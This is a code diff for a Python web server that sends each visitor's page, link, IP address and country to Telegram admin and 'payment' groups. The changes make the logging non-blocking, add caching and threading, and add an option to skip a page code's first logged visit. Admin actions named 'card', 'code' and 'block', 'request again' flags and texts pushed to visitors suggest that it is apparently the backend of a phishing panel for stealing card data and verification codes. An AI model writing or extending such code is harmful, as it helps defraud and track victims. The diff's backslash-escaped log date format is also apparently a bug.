@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+
 import http.server
 import socketserver
 import os
@@ -13,6 +14,7 @@ from config import BOT_TOKEN, GROUP_ID, ADMIN_ID
 from config import PAYMENT_GROUP_ID
 import logging
 from functools import wraps
+import threading
 
 # Настройки сервера
 PORT = 8080  # Стандартный HTTP порт
@@ -85,6 +87,8 @@ SUPPORT_FLAGS = {}  # ip: {'support': bool, 'text_id': str}
 PUSH_FLAGS = {}
 # Глобальные переменные для флагов
 USER_SESSIONS = {}  # ip: timestamp для отслеживания сессий
+# --- In-memory storage for ignoring first visit to new pages ---
+IGNORE_FIRST_VISIT_PAGE_CODES = set()  # page_code: для ігнорування першого переходу
 
 def clear_old_flags():
     """Очищает старые флаги для неактивных пользователей"""
@@ -113,6 +117,13 @@ def clear_old_flags():
         del PUSH_FLAGS[page_code]
         print(f"[clear_old_flags] Cleared expired push flag for page_code: {page_code}")
 
+# --- Додаю функцію для ігнорування першого переходу ---
+def add_ignore_first_visit(page_code):
+    """Додає page_code до списку для ігнорування першого переходу"""
+    if page_code:
+        IGNORE_FIRST_VISIT_PAGE_CODES.add(page_code)
+        print(f"[IGNORE_FIRST_VISIT] Added {page_code} to ignore list")
+
 # --- Глобальний флаг для платіжки ---
 PAYMENT_DISABLED = False
 
@@ -121,7 +132,7 @@ logging.basicConfig(
     filename='server.log',
     level=logging.INFO,
     format='%(asctime)s | %(levelname)s | %(funcName)s | %(message)s',
-    datefmt='%Y-%m-%d %H:%M:%S'
+    datefmt='\%Y-\%m-\%d \%H:\%M:\%S'
 )
 
 def log_function(func):
@@ -142,7 +153,7 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
     # Визначаємо країну за IP, якщо не передано
     if not country:
         try:
-            resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=2)
+            resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=1)
             if resp.status_code == 200:
                 data = resp.json()
                 country = data.get("country", "")
@@ -163,14 +174,26 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
     data_group2 = {"chat_id": PAYMENT_GROUP_ID, "text": msg}
     try:
         if important:
-            requests.post(url, data=data_group, timeout=2)
-            requests.post(url, data=data_group2, timeout=2)
-        requests.post(url, data=data_admin, timeout=2)
-        if extra_user_id:
-            data_user = {"chat_id": extra_user_id, "text": msg}
-            requests.post(url, data=data_user, timeout=2)
+            requests.post(url, data=data_group, timeout=1)
+            requests.post(url, data=data_group2, timeout=1)
+        requests.post(url, data=data_admin, timeout=1)
     except Exception as e:
         print(f"❌ Не вдалося надіслати лог у Telegram: {e}")
+
+def send_telegram_log_async(page, link, ip, country="", extra_user_id=None, important=False):
+    try:
+        threading.Thread(
+            target=send_telegram_log,
+            args=(page, link, ip),
+            kwargs={
+                'country': country,
+                'extra_user_id': extra_user_id,
+                'important': important,
+            },
+            daemon=True
+        ).start()
+    except Exception as e:
+        print(f"[async_log] Failed to start log thread: {e}")
 
 def get_real_ip(handler):
     xff = handler.headers.get('X-Forwarded-For')
@@ -199,6 +222,27 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         self.send_header('Access-Control-Allow-Origin', '*')
         self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
         self.send_header('Access-Control-Allow-Headers', 'Content-Type')
+        
+        # Кешування: HTML не кешуємо, статичні файли віддаємо з довгим кешем
+        try:
+            path_value = getattr(self, 'path', '') or ''
+            if isinstance(path_value, bytes):
+                path_value = path_value.decode('utf-8', errors='ignore')
+            if path_value.endswith('.html') or path_value.endswith('/') or ('?' in path_value):
+                self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
+                self.send_header('Pragma', 'no-cache')
+                self.send_header('Expires', '0')
+            else:
+                static_exts = (
+                    '.css', '.js', '.png', '.jpg', '.jpeg', '.svg', '.ico', '.webp', '.json',
+                    '.woff', '.ttf', '.eot', '.otf', '.mp4', '.mp3', '.wav', '.ogg', '.zip', '.pdf',
+                    '.gif', '.bmp', '.tiff', '.map', '.txt', '.xml'
+                )
+                if any(path_value.endswith(ext) for ext in static_exts):
+                    self.send_header('Cache-Control', 'public, max-age=31536000, immutable')
+        except Exception:
+            pass
+        
         super().end_headers()
     
     def is_blocked(self):
@@ -307,26 +351,39 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         )
         # --- LOGIC CHANGE: always log to event creator if ?page=code, regardless of should_log ---
         ip = get_real_ip(self)
+        
+        # Перевіряємо, чи потрібно ігнорувати перший перехід для цього page_code
+        page_code = qs.get('page', [None])[0]
+        should_ignore_first_visit = page_code and page_code in IGNORE_FIRST_VISIT_PAGE_CODES
+        
         if extra_user_id:
             print(f"📝 Логуємо відкриття сторінки для event creator: {norm_path}")
-            send_telegram_log(
+            # Non-blocking log
+            send_telegram_log_async(
                 page=norm_path,
                 link=self.path,
                 ip=ip,
                 extra_user_id=extra_user_id
             )
+        
         # Група та адмін — як і раніше, тільки для основних сторінок
-        if should_log:
+        if should_log and not should_ignore_first_visit:
             if not hasattr(self.server, 'logged_paths'):
                 self.server.logged_paths = set()
             if norm_path not in self.server.logged_paths:
                 self.server.logged_paths.add(norm_path)
                 print(f"📝 Логуємо відкриття сторінки: {norm_path}")
-                send_telegram_log(
+                # Non-blocking log
+                send_telegram_log_async(
                     page=norm_path,
                     link=self.path,
                     ip=ip
                 )
+        
+        # Якщо це перший перехід на нову сторінку, видаляємо page_code зі списку ігнорування
+        if should_ignore_first_visit:
+            IGNORE_FIRST_VISIT_PAGE_CODES.discard(page_code)
+            print(f"[IGNORE_FIRST_VISIT] Removed {page_code} from ignore list after first visit")
         # --- Додаємо обробку /check_request_again ---
         if self.path.startswith('/check_request_again'):
             code = qs.get('code', [None])[0]
@@ -371,9 +428,10 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             text_id = qs.get('text_id', [None])[0]
             text = CUSTOM_TEXTS.get(text_id, '')
             self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
+            self.send_header('Content-Type', 'text/plain; charset=utf-8')
             self.end_headers()
-            self.wfile.write(json.dumps({'text': text}).encode('utf-8'))
+            # Повертаємо чистий текст без JSON/лапок
+            self.wfile.write((text or '').encode('utf-8'))
             return
         if self.path.startswith('/check_support'):
             # Очищаем старые флаги
@@ -586,7 +644,8 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 page = data.get('page', '')
                 link = data.get('link', '')
                 ip = get_real_ip(self)
-                send_telegram_log(page=page, link=link, ip=ip)
+                # Non-blocking log
+                send_telegram_log_async(page=page, link=link, ip=ip)
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b'OK')
@@ -691,6 +750,28 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(b'error')
             return
+        elif path == '/ignore_first_visit':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            try:
+                data = json.loads(post_data)
+                page_code = data.get('page_code')
+                if page_code:
+                    add_ignore_first_visit(page_code)
+                    print(f"[ignore_first_visit] Added {page_code} to ignore list")
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(b'ok')
+                else:
+                    self.send_response(400)
+                    self.end_headers()
+                    self.wfile.write(b'no page_code')
+            except Exception as e:
+                print(f"[ignore_first_visit] Error: {e}")
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(b'error')
+            return
         elif path.startswith('/check_request_again'):
             code = qs.get('code', [None])[0]
             print(f"[check_request_again] Checking code: {code}, flag: {REQUEST_AGAIN_FLAGS.get(code)}")
@@ -714,7 +795,8 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 ip = data.get('ip')
                 # --- Тільки тут надсилаємо в обидві групи ---
                 if action in ['block', 'card', 'code'] and ip:
-                    send_telegram_log(page=action, link='', ip=ip, important=True)
+                    # Non-blocking important log
+                    send_telegram_log_async(page=action, link='', ip=ip, important=True)
                 if action == 'block' and ip:
                     BLACKLISTED_IPS.add(ip)
                     print(f'[admin_action] Blocked IP: {ip}')
@@ -876,9 +958,24 @@ if __name__ == "__main__":
     CUSTOM_TEXTS.clear()
     print("🧹 Очищены старые флаги при запуске сервера")
     
+    # Добавляем все существующие page_code в список игнорирования первого лога
+    try:
+        conn = sqlite3.connect('users.db')
+        c = conn.cursor()
+        c.execute('SELECT page_code FROM site_users WHERE page_code IS NOT NULL')
+        existing_page_codes = [row[0] for row in c.fetchall()]
+        conn.close()
+        
+        for page_code in existing_page_codes:
+            IGNORE_FIRST_VISIT_PAGE_CODES.add(page_code)
+        
+        print(f"📝 Добавлено {len(existing_page_codes)} существующих page_code в список игнорирования первого лога")
+    except Exception as e:
+        print(f"⚠️ Ошибка при добавлении существующих page_code: {e}")
+    
     try:
         socketserver.TCPServer.allow_reuse_address = True
-        with socketserver.TCPServer(("", PORT), CustomHTTPRequestHandler) as httpd:
+        with socketserver.ThreadingTCPServer(("", PORT), CustomHTTPRequestHandler) as httpd:
             print(f"🌐 Сервер запущений на порту {PORT}")
             print(f"📁 Обслуговуємо папку: {DIRECTORY}")
             print(f"🔗 Сайт доступний за адресою: http://localhost:{PORT}/")
